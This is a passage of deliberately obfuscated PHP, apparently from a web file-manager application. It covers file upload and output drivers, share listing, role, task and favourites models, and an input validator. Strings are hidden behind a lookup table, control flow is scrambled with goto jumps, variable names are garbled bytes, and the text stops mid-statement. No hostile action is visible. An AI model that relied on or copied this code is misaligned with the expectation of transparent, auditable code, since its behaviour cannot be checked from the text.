return $this->getPathOuter($b½ââñ¥Üà); } public function uploadFileByID($e‡‚½®§Æ, $CÂÏóÀ¼ë–, $f‹Ş‰Ûø£°) { $e¯Ø¾Ù“ñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fŞñùÜ§„ = $this->parse($e‡‚½®§Æ); $DŸ·´ÄÊ = $this->model->addFileByFileID($fŞñùÜ§„[$e¯Ø¾Ù“ñ[364]], $CÂÏóÀ¼ë–, $fŞñùÜ§„[$e¯Ø¾Ù“ñ[75]], $f‹Ş‰Ûø£°); return $this->getPathOuter($DŸ·´ÄÊ); } public function addFileByRemote($FÉâ„†ÔÀ, $DêÙ©Ú‰÷Ë, $aÏÊ–Ö°™ = array(), $cÒæ˜áŸª = '', $Céö£¢Îè”) { $D¢ªğ‰Ì— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fŸóîÚ×Ï = $this->parse($FÉâ„†ÔÀ); $cÒæ˜áŸª = empty($cÒæ˜áŸª) ? $fŸóîÚ×Ï[$D¢ªğ‰Ì—[75]] : $cÒæ˜áŸª; $Fé„‘· †Ø = $this->model->addFileByRemote($fŸóîÚ×Ï[$D¢ªğ‰Ì—[364]], $DêÙ©Ú‰÷Ë, $cÒæ˜áŸª, $aÏÊ–Ö°™, $Céö£¢Îè”); return $this->getPathOuter($Fé„‘· †Ø); } public function uploadLink($eÈ£Ä‚¸ÏÙ, $b£°ÂĞ—‡± = 0) { $A¬éÙ‡ÈÆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Bœ¨•ò¦ = $this->parse($eÈ£Ä‚¸ÏÙ); $eÈ£Ä‚¸ÏÙ = Model($A¬éÙ‡ÈÆ[540])->createFileName($Bœ¨•ò¦[$A¬éÙ‡ÈÆ[75]]); $A ¡Äâ» × = IO::uploadLink($eÈ£Ä‚¸ÏÙ, $b£°ÂĞ—‡±); return $A ¡Äâ» ×; } public function fileNameAuto($EìË´Ù‡·ˆ, $aÒïÅô½ÄŠ, $bÔ•®¥äìŸ = REPEAT_REPLACE, $aÔÓ÷••ÚÔ = false) { return $this->model->fileNameAuto($EìË´Ù‡·ˆ, $aÒïÅô½ÄŠ, $bÔ•®¥äìŸ, $aÔÓ÷••ÚÔ); } public function fileNameExist($A‚¨îôÕÇ, $AÍä‹…ë) { return $this->model->fileNameExist($A‚¨îôÕÇ, $AÍä‹…ë); } protected function _fileOut($D”ŒŸäœÖñ, $c‚ø£ŞàÔ = false, $d‘¶Ûõ¬Òª = false, $Cô¿¹õ®Ï = '', $D¹”ŞîÓÏÉ = false) { goto Bˆ³å”œÖ³; eŸ§‚ÎÜ«: if ($D¹”ŞîÓÏÉ) { return IO::fileOutServer($D­òÆàÁî[$cˆŞóá¨ƒ¶[75]], $c‚ø£ŞàÔ, $Cë’ŞÂâ, $Cô¿¹õ®Ï); } IO::fileOut($D­òÆàÁî[$cˆŞóá¨ƒ¶[75]], $c‚ø£ŞàÔ, $Cë’ŞÂâ, $Cô¿¹õ®Ï); goto C‘ä‹õ¤†; Bˆ³å”œÖ³: $cˆŞóá¨ƒ¶ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E÷ÅœÁ‹Íˆ = $this->model->sourceInfo($D”ŒŸäœÖñ); if ($E÷ÅœÁ‹Íˆ[$cˆŞóá¨ƒ¶[367]] == $cˆŞóá¨ƒ¶[83]) { header($cˆŞóá¨ƒ¶[1104]); die; } goto AƒÁ°øĞ°Ü; AƒÁ°øĞ°Ü: $D­òÆàÁî = $this->model->fileInfoGet($D”ŒŸäœÖñ); $Cô¿¹õ®Ï = $D­òÆàÁî[$cˆŞóá¨ƒ¶[160]] ? $D­òÆàÁî[$cˆŞóá¨ƒ¶[160]] : $Cô¿¹õ®Ï; $Cë’ŞÂâ = isset($GLOBALS[$cˆŞóá¨ƒ¶[1105]]) ? $GLOBALS[$cˆŞóá¨ƒ¶[1105]] : $E÷ÅœÁ‹Íˆ[$cˆŞóá¨ƒ¶[28]]; goto eŸ§‚ÎÜ«; C‘ä‹õ¤†: } public function fileOut($BÍÇ¥ÖÎÄ, $b¢Ğ¡»Ğ³Ò = false, $CÅÅøÀÔÍŠ = false, $e™õÜåŠ‚ = '') { $this->_fileOut($BÍÇ¥ÖÎÄ, $b¢Ğ¡»Ğ³Ò, $CÅÅøÀÔÍŠ, $e™õÜåŠ‚); } public function fileOutServer($eÖ»Ü§Î…œ, $böƒ…Š‹˜¦ = false, $e™‡À×ù‚‹ = false, $dŸĞË®Õ³ = '') { $this->_fileOut($eÖ»Ü§Î…œ, $böƒ…Š‹˜¦, $e™‡À×ù‚‹, $dŸĞË®Õ³, !0); } protected function _fileOutImage($c©»ã®²……, $b¤‡öŠ¥™¥ = 250) { $föËÏí‘º¦ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FæÂ¢çÌ¨‹ = $this->model->sourceInfo($c©»ã®²……); if ($FæÂ¢çÌ¨‹[$föËÏí‘º¦[367]] == $föËÏí‘º¦[83]) { show_json($föËÏí‘º¦[1106] . $c©»ã®²……, !1); } $GLOBALS[$föËÏí‘º¦[1105]] = $FæÂ¢çÌ¨‹[$föËÏí‘º¦[28]]; $A‰Æ…Á´Ö¾ = $this->model->fileInfoGet($c©»ã®²……); IO::fileOutImage($A‰Æ…Á´Ö¾[$föËÏí‘º¦[75]], $b¤‡öŠ¥™¥); } public function fileOutImage($d±À„ëàªŠ, $C™ï³–Õ­» = 250) { $this->_fileOutImage($d±À„ëàªŠ, $C™ï³–Õ­»); } public function fileOutImageServer($B‘òÖ Œ, $EÊØñ„„º„ = 250) { $this->_fileOutImage($B‘òÖ Œ, $EÊØñ„„º„); } public function link($Cˆ»Äãààè, $dŒìÉ É ã = '') { $b¥°…Ø‚‡ = $this->model->fileInfoGet($Cˆ»Äãààè); return IO::link($b¥°…Ø‚‡[$_SERVER[ÚŠ•´ÍéÒÑÔ][75]], $dŒìÉ É ã); } protected function parse($a×¾ÊÇœ™Ë) { $aİ¯Û¾¶– =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (strstr($a×¾ÊÇœ™Ë, $aİ¯Û¾¶–[8]) === !1) { return array($aİ¯Û¾¶–[382] => intval($a×¾ÊÇœ™Ë), $aİ¯Û¾¶–[75] => $aİ¯Û¾¶–[33], $aİ¯Û¾¶–[1103] => array()); } $c¨½öÄ·Í¯ = explode($aİ¯Û¾¶–[8], trim($a×¾ÊÇœ™Ë, $aİ¯Û¾¶–[8])); if (count($c¨½öÄ·Í¯) < 2) { show_tips($a×¾ÊÇœ™Ë . $aİ¯Û¾¶–[1107]); } return array($aİ¯Û¾¶–[382] => intval($c¨½öÄ·Í¯[0]), $aİ¯Û¾¶–[75] => $c¨½öÄ·Í¯[1], $aİ¯Û¾¶–[1103] => array_slice($c¨½öÄ·Í¯, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Då¼ºôäì) { $this->pathParse = $Då¼ºôäì; $this->model = Model($_SERVER[ÚŠ•´ÍéÒÑÔ][1102]); } public function getPathOuter($a‘Ä„ä‚Çï) { $cÓéÄ˜Ôæñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$a‘Ä„ä‚Çï) { return $a‘Ä„ä‚Çï; } $f¡˜»ˆ¬ˆó = $this->parse($a‘Ä„ä‚Çï); return trim(KodIO::makeShare($this->pathParse[$cÓéÄ˜Ôæñ[364]], $f¡˜»ˆ¬ˆó[$cÓéÄ˜Ôæñ[364]]), $cÓéÄ˜Ôæñ[8]); } protected function infoParse($FÌÜäÇòˆ«, $Cê”‹ÖõÀà = false, $Bç¬Õóµ = false) { $eŒİ•ØÂÆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E§¼†×ÇŒ = $this->pathParse[$eŒİ•ØÂÆ[364]]; $díÆ ×õâ = trim($this->pathParse[$eŒİ•ØÂÆ[1003]], $eŒİ•ØÂÆ[8]); return Action($eŒİ•ØÂÆ[1108])->sharePathInfo($E§¼†×ÇŒ, $díÆ ×õâ); } public function infoFull($f®Ï’ÜŞãœ) { $E°â‡ëé½Û =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bÖŸâŸË = explode($E°â‡ëé½Û[8], trim($f®Ï’ÜŞãœ, $E°â‡ëé½Û[8])); if (count($bÖŸâŸË) > 1) { $DÖßš™£‚â = implode($E°â‡ëé½Û[8], array_splice($bÖŸâŸË, 1)); $eÃ‰Œ˜Ä = $this->model->pathInfoByPath($bÖŸâŸË[0], $DÖßš™£‚â); if (!$eÃ‰Œ˜Ä) { return !1; } $this->pathParse[$E°â‡ëé½Û[1003]] = $eÃ‰Œ˜Ä[$E°â‡ëé½Û[366]]; } return $this->infoParse($f®Ï’ÜŞãœ); } public function listAll($F²šØªˆŸ«) { goto f… ¡¶ÌÙ; f… ¡¶ÌÙ: $c«äÚ›Šƒˆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cì÷ƒÎÂ© = IO::info($this->pathParse[$c«äÚ›Šƒˆ[75]]); if (!$cì÷ƒÎÂ©) { return array(); } goto D‡Š»ÖİÉ÷; D‡Š»ÖİÉ÷: $a«“‡ì÷«Ñ = $this->model->listAll($F²šØªˆŸ«); $d¸Â…ìËŠ³ = Model($c«äÚ›Šƒˆ[532])->getInfo($cì÷ƒÎÂ©[$c«äÚ›Šƒˆ[437]]); $EÜ¢£î‹îç = Action($c«äÚ›Šƒˆ[1108]); goto BéÄ—Ë…; BéÄ—Ë…: foreach ($a«“‡ì÷«Ñ as &$fØ’Êïº„) { check_abort(); $fØ’Êïº„[$c«äÚ›Šƒˆ[388]] = $EÜ¢£î‹îç->_shareItemeParse($fØ’Êïº„[$c«äÚ›Šƒˆ[388]], $d¸Â…ìËŠ³); } return $a«“‡ì÷«Ñ; goto BÉÚÛˆ›Ğó; BÉÚÛˆ›Ğó: } } goto f°Âó½Å‡»; D“ŠÂÀø‚æ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\162\x6f\154\145\114\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\141\x75\x74\x68", "\154\x61\x62\145\154", "\144\151\x73\160\x6c\141\x79", "\x73\x79\163\x74\x65\155", "\144\145\163\x63", "\x69\147\x6e\157\162\x65\105\170\x74", "\151\x67\156\x6f\x72\x65\106\x69\154\145\x53\x69\172\x65", "\x61\144\x6d\151\156\x69\x73\164\x72\141\x74\x6f\x72", "\163\x6f\162\164"); public function listData($B¹ß™ª·«Ã = false, $EïŞ»ïËÚŞ = "\x73\x6f\162\x74", $f‰Î›½†ó± = false) { return parent::listData($B¹ß™ª·«Ã, $EïŞ»ïËÚŞ, $f‰Î›½†ó±); } public function update($Dôî¤Ùƒ”, $Cä‚ê›Ë›„) { goto dàö¥’; cÂƒùù»Ü: return parent::update($Dôî¤Ùƒ”, $Cä‚ê›Ë›„); goto F†…Ó©ƒ¦‘; dàö¥’: $AÓáÌËã§ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FØ·ÏÂÜÑï = parent::listData($Dôî¤Ùƒ”); $D¬°ïÄŠ¢ = $this->findByName($Cä‚ê›Ë›„[$AÓáÌËã§[28]]); goto bä…ë™–; bä…ë™–: if (!$FØ·ÏÂÜÑï || $D¬°ïÄŠ¢ && $D¬°ïÄŠ¢[$AÓáÌËã§[364]] != $FØ·ÏÂÜÑï[$AÓáÌËã§[364]]) { return !1; } if ($D¬°ïÄŠ¢[$AÓáÌËã§[2438]] == 1) { $Cä‚ê›Ë›„ = array($AÓáÌËã§[28] => $Cä‚ê›Ë›„[$AÓáÌËã§[28]], $AÓáÌËã§[2090] => $Cä‚ê›Ë›„[$AÓáÌËã§[2090]]); } $this->filterAuth($Cä‚ê›Ë›„[$AÓáÌËã§[373]]); goto cÂƒùù»Ü; F†…Ó©ƒ¦‘: } public function remove($f‰Œíƒ£Û£) { $DÜñçíºÊÈ = parent::listData($f‰Œíƒ£Û£); if (!$DÜñçíºÊÈ || $DÜñçíºÊÈ[$_SERVER[ÚŠ•´ÍéÒÑÔ][1072]]) { return !1; } return parent::remove($f‰Œíƒ£Û£); } public function add($aÀ‹âåí“†) { goto dŞ—¦¬°Áœ; dŞ—¦¬°Áœ: $a¶ÌİïÂ‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CòëØ‡âªˆ = $aÀ‹âåí“†[$a¶ÌİïÂ‘[28]]; if ($this->findByName($CòëØ‡âªˆ)) { return !1; } goto a‡ÈÄêË; d­ç¦Šƒ×å: return parent::insert($aÀ‹âåí“†); goto A¡ÊÛ¢¼ˆ; a‡ÈÄêË: $c¦‘ŠÆ³ß· = array($a¶ÌİïÂ‘[383] => $CòëØ‡âªˆ, $a¶ÌİïÂ‘[2078] => $a¶ÌİïÂ‘[33], $a¶ÌİïÂ‘[2074] => $a¶ÌİïÂ‘[2091], $a¶ÌİïÂ‘[2439] => 1, $a¶ÌİïÂ‘[2077] => 0, $a¶ÌİïÂ‘[2440] => 0, $a¶ÌİïÂ‘[2076] => $this->getSort()); $aÀ‹âåí“† = array_merge($c¦‘ŠÆ³ß·, $aÀ‹âåí“†); $this->filterAuth($aÀ‹âåí“†[$a¶ÌİïÂ‘[373]]); goto d­ç¦Šƒ×å; A¡ÊÛ¢¼ˆ: } private function getSort() { $bµ…ÊÅäÇÌ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÑî¢†¾Åâ = parent::listData(); $B²„ƒ°‚¹ = array_to_keyvalue($aÑî¢†¾Åâ, $bµ…ÊÅäÇÌ[33], $bµ…ÊÅäÇÌ[2093]); return empty($B²„ƒ°‚¹) ? 0 : max($B²„ƒ°‚¹) + 1; } private function filterAuth(&$f’ğÜåòóã) { $A°œĞÉòº¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E»±ÚÄîÛŠ = array(); $fé‚£†¦ò‡ = array_filter(explode($A°œĞÉòº¼[47], $f’ğÜåòóã)); foreach ($fé‚£†¦ò‡ as $f’ğÜåòóã) { $DëÒ Ò¯­õ = explode($A°œĞÉòº¼[93], $f’ğÜåòóã); if ($DëÒ Ò¯­õ[0] == $A°œĞÉòº¼[1752] && $DëÒ Ò¯­õ[1] != $A°œĞÉòº¼[1028]) { $eŒĞ“˜ê‘ = $DëÒ Ò¯­õ[0] . $A°œĞÉòº¼[93] . $DëÒ Ò¯­õ[1] . $A°œĞÉòº¼[2441]; if (!in_array($eŒĞ“˜ê‘, $fé‚£†¦ò‡)) { $E»±ÚÄîÛŠ[] = $eŒĞ“˜ê‘; } } $E»±ÚÄîÛŠ[] = $f’ğÜåòóã; } $f’ğÜåòóã = implode($A°œĞÉòº¼[47], $E»±ÚÄîÛŠ); } public function sort($a„¦Ìğ¤õ, $A¡öÄÙÄÍ) { return parent::update($a„¦Ìğ¤õ, $A¡öÄÙÄÍ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\x74\141\163\x6b\x4c\x69\163\x74"; public $field = array("\x6e\141\155\145", "\164\x79\x70\x65", "\x65\x76\145\156\x74", "\164\x69\155\145", "\x64\x65\163\x63", "\163\171\x73\x74\145\x6d", "\145\x6e\x61\x62\154\145", "\x6c\141\163\164\x52\x75\x6e", "\x73\x6f\x72\164"); public function listData($fÖ©îÊ¾ê× = false, $D‰š»¼¶šÙ = "\x73\x6f\162\164", $d“Ş‡—¾Üµ = false) { return parent::listData($fÖ©îÊ¾ê×, $D‰š»¼¶šÙ, $d“Ş‡—¾Üµ); } public function add($BÁŒÆì¿˜›) { $f¶‚Õî•ïŸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c¶ïëÌ­Æ = $this->findByName($BÁŒÆì¿˜›[$f¶‚Õî•ïŸ[28]]); if ($c¶ïëÌ­Æ) { return !1; } $BÁŒÆì¿˜›[$f¶‚Õî•ïŸ[1374]] = 0; $BÁŒÆì¿˜›[$f¶‚Õî•ïŸ[2093]] = $this->getSort(); return parent::insert($BÁŒÆì¿˜›); } private function getSort() { $Cğè…Œ†® =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fËˆğï¢˜¼ = parent::listData(); $EÅê£ƒëŸ¿ = array_to_keyvalue($fËˆğï¢˜¼, $Cğè…Œ†®[33], $Cğè…Œ†®[2093]); return empty($EÅê£ƒëŸ¿) ? 0 : max($EÅê£ƒëŸ¿) + 1; } public function update($C¹”ß×²ºŒ, $D§×¤–Ìè) { $cÍ›­½ÀÆˆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DÊ„…ö†î = $this->listData($C¹”ß×²ºŒ); $B¿ÍâŞ‹Ü‚ = $this->findByName($D§×¤–Ìè[$cÍ›­½ÀÆˆ[28]]); if (!$DÊ„…ö†î || $B¿ÍâŞ‹Ü‚ && $B¿ÍâŞ‹Ü‚[$cÍ›­½ÀÆˆ[364]] != $DÊ„…ö†î[$cÍ›­½ÀÆˆ[364]]) { return !1; } return parent::update($C¹”ß×²ºŒ, $D§×¤–Ìè); } public function remove($B‚œ°ÁîÀ¥, $b¼¶†áé ± = false) { $FÈ¶ÇÛ’ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c–á¡öğÕ¼ = $this->listData($B‚œ°ÁîÀ¥); if (!$c–á¡öğÕ¼) { return; } if (!$b¼¶†áé ± && $c–á¡öğÕ¼[$FÈ¶ÇÛ’[1072]] == $FÈ¶ÇÛ’[83]) { return !1; } return parent::remove($B‚œ°ÁîÀ¥); } public function enable($FßˆçìÛ³›, $E…²†ËÌ) { return $this->update($FßˆçìÛ³›, array($_SERVER[ÚŠ•´ÍéÒÑÔ][2432] => $E…²†ËÌ)); } public function run($E’ÌâÓ‹Ô«) { return $this->update($E’ÌâÓ‹Ô«, array($_SERVER[ÚŠ•´ÍéÒÑÔ][2442] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($D‰ïå’”éñ) { $BŸ–ÔîùÍ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return array($BŸ–ÔîùÍ[2443] => array(USER_ID, $BŸ–ÔîùÍ[2444])); } protected function listData() { $a²ÄÁâÙİ° =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cÇ¯÷í¤ = array($a²ÄÁâÙİ°[1400] => USER_ID, $a²ÄÁâÙİ°[432] => 0); $EÛ¾İ¥º = $a²ÄÁâÙİ°[2445]; $A’Ã“å³Êˆ = $this->field($EÛ¾İ¥º)->where($cÇ¯÷í¤)->order($a²ÄÁâÙİ°[2446])->select(); return $A’Ã“å³Êˆ ? $A’Ã“å³Êˆ : array(); } protected function resetCache() { } protected function listView() { goto D·’À”ªšİ; E¨¢Š“£Æ‹: $dñëñÒÖ˜ = array($CĞ¡Øò’Ø[380] => array($CĞ¡Øò’Ø[381], $FÄİ¬¶¶)); $E×‡ØÀƒä = Model($CĞ¡Øò’Ø[747])->listSource($dñëñÒÖ˜, $eñ”§ÎßåÕ); $E×‡ØÀƒä = array_merge($E×‡ØÀƒä[$CĞ¡Øò’Ø[73]], $E×‡ØÀƒä[$CĞ¡Øò’Ø[74]]); goto cÇ¦šğÙÌĞ; D·’À”ªšİ: $CĞ¡Øò’Ø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÙ”¶†™±„ = $this->listData(); $a¶Ï‚Ø­ø´ = array_filter_by_field($AÙ”¶†™±„, $CĞ¡Øò’Ø[29], $CĞ¡Øò’Ø[379]); goto dÀ®±£™è—; dÀ®±£™è—: $FÄİ¬¶¶ = array_to_keyvalue($a¶Ï‚Ø­ø´, $CĞ¡Øò’Ø[33], $CĞ¡Øò’Ø[75]); if (!$FÄİ¬¶¶) { return $AÙ”¶†™±„; } $eñ”§ÎßåÕ = 2000; goto E¨¢Š“£Æ‹; cÇ¦šğÙÌĞ: $E×‡ØÀƒä = array_to_keyvalue($E×‡ØÀƒä, $CĞ¡Øò’Ø[366]); foreach ($AÙ”¶†™±„ as $aóääâ·à => $AÁŠåîøÖ) { $aª²Óøƒ¹Ò = $E×‡ØÀƒä[$AÁŠåîøÖ[$CĞ¡Øò’Ø[75]]]; $aª²Óøƒ¹Ò = $aª²Óøƒ¹Ò ? $aª²Óøƒ¹Ò : array(); $AÙ”¶†™±„[$aóääâ·à] = array_merge($aª²Óøƒ¹Ò, $AÁŠåîøÖ); } return $AÙ”¶†™±„; goto C¢õõÓ¿˜‘; C¢õõÓ¿˜‘: } protected function addFav($AĞ¥×ùç¸¹, $Bé÷†êÉÒÒ = '', $bê£¤Ö²¦Ç = "\x73\157\x75\x72\x63\x65") { goto DâìÑ Š£š; B×Ãƒ¤ôì³: return $this->add($A…«’î²×¦); goto c‰†„¨ºÜ; DâìÑ Š£š: $b®Öå‚•ö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e˜„å‚½•× = array($b®Öå‚•ö[1400] => USER_ID, $b®Öå‚•ö[432] => 0, $b®Öå‚•ö[385] => $bê£¤Ö²¦Ç, $b®Öå‚•ö[384] => $AĞ¥×ùç¸¹); if ($this->where($e˜„å‚½•×)->find()) { return !1; } goto E“‘Æö†‘É; E“‘Æö†‘É: $e˜„å‚½•× = array($b®Öå‚•ö[1400] => USER_ID, $b®Öå‚•ö[432] => 0); $cêã§‚Ÿ = $this->where($e˜„å‚½•×)->max($b®Öå‚•ö[2093]); if (!$cêã§‚Ÿ) { $cêã§‚Ÿ = 0; } goto cÚ¡‚…‹“; cÚ¡‚…‹“: if (!$Bé÷†êÉÒÒ && $bê£¤Ö²¦Ç == $b®Öå‚•ö[379]) { $eˆ…²¥‘äÄ = Model($b®Öå‚•ö[1102])->where(array($b®Öå‚•ö[380] => $AĞ¥×ùç¸¹))->find(); if (!$eˆ…²¥‘äÄ) { return !1; } $Bé÷†êÉÒÒ = $eˆ…²¥‘äÄ[$b®Öå‚•ö[28]]; } $Bé÷†êÉÒÒ = $this->getAutoName($Bé÷†êÉÒÒ); $A…«’î²×¦ = array($b®Öå‚•ö[1400] => USER_ID, $b®Öå‚•ö[432] => 0, $b®Öå‚•ö[383] => $Bé÷†êÉÒÒ, $b®Öå‚•ö[384] => $AĞ¥×ùç¸¹, $b®Öå‚•ö[385] => $bê£¤Ö²¦Ç, $b®Öå‚•ö[2076] => $cêã§‚Ÿ + 1); goto B×Ãƒ¤ôì³; c‰†„¨ºÜ: } protected function remove($Dï¶‚Š‚) { $CĞ°ĞšŸÎ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Cà–Ê‰£µ = array($CĞ°ĞšŸÎ[1400] => USER_ID, $CĞ°ĞšŸÎ[382] => $Dï¶‚Š‚); return $this->where($Cà–Ê‰£µ)->delete(); } protected function removeByName($DÓ«ªá™…á) { $C›–³áÛğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b‰—­í§˜ø = array($C›–³áÛğ[1400] => USER_ID, $C›–³áÛğ[383] => $DÓ«ªá™…á, $C›–³áÛğ[432] => 0); return $this->where($b‰—­í§˜ø)->delete(); } protected function rename($BÌÜº©­²¢, $fÙŒö³¥‚Ü) { $fÎƒ“³›ø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($BÌÜº©­²¢ == $fÙŒö³¥‚Ü) { return !1; } $A¿¬¶í’Ô = $this->getAutoName($fÙŒö³¥‚Ü); if ($fÙŒö³¥‚Ü != $A¿¬¶í’Ô) { return !1; } $EÓ…ô–¤»© = array($fÎƒ“³›ø[1400] => USER_ID, $fÎƒ“³›ø[432] => 0, $fÎƒ“³›ø[28] => $BÌÜº©­²¢); return $this->where($EÓ…ô–¤»©)->save(array($fÎƒ“³›ø[28] => $fÙŒö³¥‚Ü)); } protected function resetSort($dëğÊÂÇƒ¸) { $FÔ³ö‰À‰‹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dëğÊÂÇƒ¸ = is_array($dëğÊÂÇƒ¸) ? $dëğÊÂÇƒ¸ : array(); $E¨ğŞÇÑ• = array($FÔ³ö‰À‰‹[1400] => USER_ID); for ($d¹™…¤‰Ÿ¥ = 0; $d¹™…¤‰Ÿ¥ < count($dëğÊÂÇƒ¸); $d¹™…¤‰Ÿ¥++) { $E¨ğŞÇÑ•[$FÔ³ö‰À‰‹[382]] = $dëğÊÂÇƒ¸[$d¹™…¤‰Ÿ¥]; $this->where($E¨ğŞÇÑ•)->save(array($FÔ³ö‰À‰‹[2076] => $d¹™…¤‰Ÿ¥ + 1)); } return !0; } protected function moveTop($D÷ù Èèï) { goto fí‘—¸¡ù; BÉ•ÅÜ–ˆ: if (!$d¤Õ–…½Á ) { return; } $FƒÜ± ´Ú¡ = $this->field($Bã¸³×¥ù¹[364])->where($Döñƒ¹ÉŸ¨)->order($Bã¸³×¥ù¹[2446])->select(); $FƒÜ± ´Ú¡ = array_to_keyvalue($FƒÜ± ´Ú¡, $Bã¸³×¥ù¹[33], $Bã¸³×¥ù¹[364]); goto E©ºÎ¾§ƒ…; E©ºÎ¾§ƒ…: $Aà¢£­ïç¦ = $FƒÜ± ´Ú¡; $FƒÜ± ´Ú¡ = array_remove_value($FƒÜ± ´Ú¡, $d¤Õ–…½Á [$Bã¸³×¥ù¹[364]]); array_unshift($FƒÜ± ´Ú¡, $d¤Õ–…½Á [$Bã¸³×¥ù¹[364]]); goto Aàòï¥Ø¤Š; Aàòï¥Ø¤Š: return $this->resetSort($FƒÜ± ´Ú¡); goto B¸•Ô†àÉ“; fí‘—¸¡ù: $Bã¸³×¥ù¹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Döñƒ¹ÉŸ¨ = array($Bã¸³×¥ù¹[1400] => USER_ID, $Bã¸³×¥ù¹[432] => 0); $d¤Õ–…½Á  = $this->where($Döñƒ¹ÉŸ¨)->where(array($Bã¸³×¥ù¹[28] => $D÷ù Èèï))->find(); goto BÉ•ÅÜ–ˆ; B¸•Ô†àÉ“: } protected function moveBottom($AØ†­è›×Ç) { $Fâù‡’ ‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A§ÇìÚË¹Ã = array($Fâù‡’ ‚[1400] => USER_ID, $Fâù‡’ ‚[432] => 0); $EñöŠîÖë¿ = $this->where($A§ÇìÚË¹Ã)->max($Fâù‡’ ‚[2093]); $D¸÷˜‘©‹ = array($Fâù‡’ ‚[2093] => $EñöŠîÖë¿ + 1); return $this->where($A§ÇìÚË¹Ã)->where(array($Fâù‡’ ‚[28] => $AØ†­è›×Ç))->save($D¸÷˜‘©‹); } private function getAutoName($bÓá „ºè) { goto eíÑëÒÖÒ; b¥Ù•©…‹¢: $c‚¯Ñ¸Üù = array_to_keyvalue($c‚¯Ñ¸Üù, $Cæ¹¯Ë¢„[33], $Cæ¹¯Ë¢„[28]); if (!$c‚¯Ñ¸Üù || !in_array($bÓá „ºè, $c‚¯Ñ¸Üù)) { return $bÓá „ºè; } for ($d™¨áŒÖßª = 0; $d™¨áŒÖßª < count($c‚¯Ñ¸Üù); $d™¨áŒÖßª++) { if (!in_array($bÓá „ºè . "\50{$d™¨áŒÖßª}\x29", $c‚¯Ñ¸Üù)) { return $bÓá „ºè . "\50{$d™¨áŒÖßª}\51"; } } goto DòÆª›ƒå; DòÆª›ƒå: return $bÓá „ºè . "\x28{$d™¨áŒÖßª}\x29"; goto d¹ø„Äš; eíÑëÒÖÒ: $Cæ¹¯Ë¢„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bõè‡ìáÛ = array($Cæ¹¯Ë¢„[1400] => USER_ID, $Cæ¹¯Ë¢„[432] => 0); $c‚¯Ñ¸Üù = $this->field($Cæ¹¯Ë¢„[28])->where($bõè‡ìáÛ)->select(); goto b¥Ù•©…‹¢; d¹ø„Äš: } } goto Bº£šÜ”Ş«; dˆİÎÀ½±¬: class Input { public static function getArray($f¾ìğË¼†¸) { goto cª“ßãïÏ‡; fÊĞã«íïá: if (count($Cöâ¨Àµº“) > 0) { show_json(implode($B¼Ñ½‡†[1849], $Cöâ¨Àµº“), !1); } return $DÖµÍ®öŸæ; goto dàñ²˜ÕÇ¸; cª“ßãïÏ‡: $B¼Ñ½‡† =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; global $in; $DÖµÍ®öŸæ = array(); goto BƒÖŸØ¹Å¦; BƒÖŸØ¹Å¦: $Cöâ¨Àµº“ = array(); $c‰Õ·›ç˜‚ = LNG($B¼Ñ½‡†[1845]); foreach ($f¾ìğË¼†¸ as $DôÒİÜ„‘ => $F¬ÌäñÒµ‚) { goto d‚‹íÙáğ‘; d‚‹íÙáğ‘: $b‹Ò´–ñá› = _get($F¬ÌäñÒµ‚, $B¼Ñ½‡†[1233], $c‰Õ·›ç˜‚ . $B¼Ñ½‡†[874] . $DôÒİÜ„‘); $cÎ·ˆ—†œ = $DôÒİÜ„‘; if (isset($F¬ÌäñÒµ‚[$B¼Ñ½‡†[1846]]) && $F¬ÌäñÒµ‚[$B¼Ñ½‡†[1846]]) { $cÎ·ˆ—†œ = $F¬ÌäñÒµ‚[$B¼Ñ½‡†[1846]]; } goto AÇÎ¢”×ŒÙ; f»Ï««‚è†: if (isset($F¬ÌäñÒµ‚[$B¼Ñ½‡†[1848]]) && !self::check($in[$DôÒİÜ„‘], $F¬ÌäñÒµ‚[$B¼Ñ½‡†[1848]], $cŞ˜Åä«àâ)) { if (array_key_exists($B¼Ñ½‡†[1847], $F¬ÌäñÒµ‚)) { if (!is_null($F¬ÌäñÒµ‚[$B¼Ñ½‡†[1847]])) { $DÖµÍ®öŸæ[$cÎ·ˆ—†œ] = $F¬ÌäñÒµ‚[$B¼Ñ½‡†[1847]]; } } else { $Cöâ¨Àµº“[] = $b‹Ò´–ñá›; } continue; } $DÖµÍ®öŸæ[$cÎ·ˆ—†œ] = 